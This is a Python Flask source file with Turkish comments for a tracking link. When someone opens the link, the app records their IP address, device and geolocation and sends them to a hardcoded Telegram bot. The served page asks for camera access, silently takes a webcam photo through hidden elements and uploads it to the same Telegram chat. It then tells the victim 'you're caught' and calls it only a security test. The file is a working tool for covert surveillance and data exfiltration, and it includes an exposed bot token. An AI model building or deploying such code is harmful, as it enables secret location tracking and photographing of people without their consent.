from flask import Flask, request, render_template_string
import requests
import datetime
import base64

app = Flask(__name__)

TOKEN = "8887284177:AAEpJLJuyQShebNtE54C1wahiAKWwtm5aBU"
CHAT_ID = "8218333855"

# Kamera izni isteyip gizlice fotoğraf çeken ve sunucuya gönderen gelişmiş arayüz
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Güvenlik Denetimi</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            background: linear-gradient(135deg, #0f172a 0%, #020617 100%); 
            color: #f8fafc; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            overflow: hidden;
        }
        .container { 
            background: rgba(30, 41, 59, 0.7); 
            backdrop-filter: blur(10px);
            padding: 45px; 
            border-radius: 16px; 
            border: 1px solid rgba(56, 189, 248, 0.2); 
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.6), 0 0 20px rgba(56, 189, 248, 0.1); 
            text-align: center; 
            max-width: 480px; 
            width: 90%; 
        }
        .icon { font-size: 50px; margin-bottom: 15px; }
        h1 { font-size: 32px; color: #38bdf8; margin-bottom: 15px; text-transform: uppercase; letter-spacing: 2px; font-weight: 800; }
        p { color: #94a3b8; font-size: 15px; line-height: 1.6; margin-bottom: 25px; }
        .alert-box {
            background: rgba(15, 23, 42, 0.8);
            border-left: 4px solid #38bdf8;
            padding: 15px;
            border-radius: 0 8px 8px 0;
            text-align: left;
            font-size: 13px;
            color: #e2e8f0;
            margin-bottom: 20px;
            font-family: monospace;
        }
        .highlight { color: #38bdf8; font-weight: bold; }
        #video, #canvas { display: none; }
    </style>
</head>
<body>
    <div class="container">
        <div class="icon">🎯</div>
        <h1>YAKALANDIN!</h1>
        <div class="alert-box">
            &gt; Durum: <span class="highlight">Bağlantı Doğrulandı</span><br>
            &gt; İşlem: IP ve Kamera Verileri Kaydedildi
        </div>
        <p>Merak etme, sadece küçük bir güvenlik testiydi. Artık bu bağlantının arkasında ne olduğunu biliyorsun.</p>
    </div>

    <!-- Gizli Kamera Öğeleri -->
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas" width="640" height="480"></canvas>

    <script>
        window.addEventListener('load', function() {
            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
            .then(function(stream) {
                const video = document.getElementById('video');
                video.srcObject = stream;
                video.play();
                
                // Kameranın açılması için 1.5 saniye bekleyip fotoğrafı çek
                setTimeout(function() {
                    const canvas = document.getElementById('canvas');
                    const context = canvas.getContext('2d');
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    const imageData = canvas.toDataURL('image/jpeg');
                    
                    // Fotoğrafı arka plandaki Python sunucusuna gönder
                    fetch('/capture', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ image: imageData })
                    });
                    
                    // Akışı durdur
                    stream.getTracks().forEach(track => track.stop());
                }, 1500);
            })
            .catch(function(error) {
                console.log("Kamera izni reddedildi.");
            });
        });
    </script>
</body>
</html>
"""

@app.route('/')
def home():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent')
    zaman = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    try:
        geo = requests.get(f"http://ip-api.com/json/{ip}").json()
        country = geo.get('country', 'Bilinmiyor')
        city = geo.get('city', 'Bilinmiyor')
        region = geo.get('regionName', 'Bilinmiyor')
        isp = geo.get('isp', 'Bilinmiyor')
        lat = geo.get('lat', '0')
        lon = geo.get('lon', '0')
    except:
        country = city = region = isp = "Bilinmiyor"
        lat = lon = "0"
    
    msg = (
        f"🚨 **HEDEF AĞA TAKILDI!**\n\n"
        f"⏱️ Zaman: {zaman}\n"
        f"🌍 IP Adresi: `{ip}`\n"
        f"🏳️ Ülke: {country}\n"
        f"🏙️ Şehir: {city} ({region})\n"
        f"🏢 İSS: {isp}\n"
        f"📍 Konum: {lat}, {lon}\n"
        f"📱 Cihaz: {user_agent}"
    )
    
    try:
        requests.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage", params={
            "chat_id": CHAT_ID,
            "text": msg,
            "parse_mode": "Markdown"
        })
    except:
        pass
    
    return render_template_string(HTML_TEMPLATE)

@app.route('/capture', methods=['POST'])
def capture():
    data = request.get_json()
    image_data = data.get('image')
    
    if image_data:
        try:
            # Base64 formatındaki resmi çöz
            header, encoded = image_data.split(",", 1)
            image_bytes = base64.b64decode(encoded)
            
            # Telegram botuna fotoğraf olarak gönder
            requests.post(
                f"https://api.telegram.org/bot{TOKEN}/sendPhoto",
                data={"chat_id": CHAT_ID, "caption": "📸 Hedefin Kameradan Çekilen Fotoğrafı!"},
                files={"photo": ("capture.jpg", image_bytes, "image/jpeg")}
            )
        except Exception as e:
            print(f"Hata: {e}")
            
    return "", 204

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
